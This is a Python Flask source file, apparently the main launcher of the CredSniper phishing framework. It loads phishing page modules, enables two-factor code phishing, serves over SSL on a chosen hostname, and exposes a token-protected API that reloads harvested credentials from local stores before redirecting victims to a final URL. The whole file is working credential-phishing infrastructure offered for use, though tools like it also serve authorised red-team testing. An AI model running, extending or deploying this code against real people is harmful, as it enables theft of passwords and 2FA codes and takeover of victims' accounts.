from flask import Flask, jsonify, request, abort, Response
from jinja2 import Environment, PackageLoader, select_autoescape
from core import config, functions
import os, importlib, argparse, time

class CredSniper():
    def __init__(self):
        self.api = None
        self.module = None
        self.module_name = None
        self.final_url = None
        self.port = None
        self.enable_2fa = None
        self.seen = set()
        self.verbose = False
        self.hostname = None

        #app = Flask(
            #__name__,
            #static_url_path='/modules/{}/templates/'.format(self.module_name)
        #)

        self.validate_args()
        self.prepare_storage()
        self.prepare_module()
        self.prepare_api()

        # TODO: Move parameters to a config for sharing
        self.config = config.Config()


    def prepare_module(self):
        package = 'modules/{}/templates'.format(self.module_name)
        env = Environment(
            loader=PackageLoader('credsniper', package),
            autoescape=select_autoescape(['html', 'xml'])
        )
        module_path = 'modules.{}.{}'.format(self.module_name, self.module_name)
        self.module = importlib.import_module(module_path).load(self.enable_2fa)
        self.module.env = env
        self.module.final_url = self.final_url

        for route in self.module.routes:
            name = route['name']
            url = route['url']
            route_method = getattr(self.module, name)
            methods = ['GET','POST']
            app.add_url_rule(url, name, route_method, methods = methods)


    def prepare_api(self):
        package = 'api.py'
        env = Environment(
            loader=PackageLoader('credsniper', package),
            autoescape=select_autoescape(['html', 'xml'])
        )
        token = functions.generate_token()
        self.api = importlib.import_module('api').load(token)
        self.api.seen = self.seen
        self.api.creds = functions.reload_creds(self.api.seen)
        self.api.module_name = self.module_name
        self.api.enable_2fa = self.enable_2fa
        self.api.verbose = self.verbose

        for route in self.api.routes:
            name = route['name']
            url = route['url']
            route_method = getattr(self.api, name)

            methods = None
            if name == 'config':
                methods = ['GET', 'POST']

            app.add_url_rule(url, name, route_method, methods=methods)


    def validate_args(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('--module', help='phishing module', required=True)
        parser.add_argument('--twofactor', help='enable two-factor phishing',
            default=False, action='store_true')
        parser.add_argument('--port', help='listening port (default: 80/443)',
            type=int, default=80)
        parser.add_argument('--ssl', help='use SSL via Let\'s Encrypt',
            action='store_true', default=False)
        parser.add_argument('--verbose', help='verbose output',
            action='store_true')
        parser.add_argument('--final', help='final url destination', required=True)
        parser.add_argument('--hostname', help='hostname for SSL', required=True)

        args = parser.parse_args()
        self.verbose = args.verbose
        self.port = args.port
        self.enable_ssl = args.ssl
        self.enable_2fa = args.twofactor
        self.module_name = args.module
        self.final_url = args.final
        self.hostname = args.hostname

        if self.enable_ssl and self.port == 80:
            self.port = 443


    def prepare_storage(self):
        if not os.path.exists('.cache'):
            os.mknod('.cache')
        if not os.path.exists('.sniped'):
            os.mknod('.sniped')

        
    def verbose_print(self, message):
        if self.verbose:
            dt = time.strftime('%Y-%m-%d %H:%M')
            print('[{}] {}'.format(dt, message))

app = Flask(__name__)
cs = CredSniper()

@app.errorhandler(401)
def custom_401(error):
    return jsonify({'message': error.description['message']}), 401

if __name__ == "__main__":
    functions.print_banner()
    cs.verbose_print('Module: {}'.format(cs.module_name))
    cs.verbose_print('Port: {}'.format(cs.port))
    cs.verbose_print('Use SSL: {}'.format(cs.enable_ssl))
    cs.verbose_print('2FA Enabled: {}'.format(cs.enable_2fa))
    cs.verbose_print('API: Loaded')
    cs.verbose_print('API Token: {}'.format(cs.api.api_token))
    cs.verbose_print('Final URL: {}'.format(cs.final_url))
    cs.verbose_print('Hostname: {}'.format(cs.hostname))

    if cs.enable_ssl:
        context = (
            'certs/{}.cert.pem'.format(cs.hostname),
            'certs/{}.privkey.pem'.format(cs.hostname)
        )
    else:
        context = None

    app.run(
        host='0.0.0.0',
        port=cs.port,
        ssl_context=context
    )
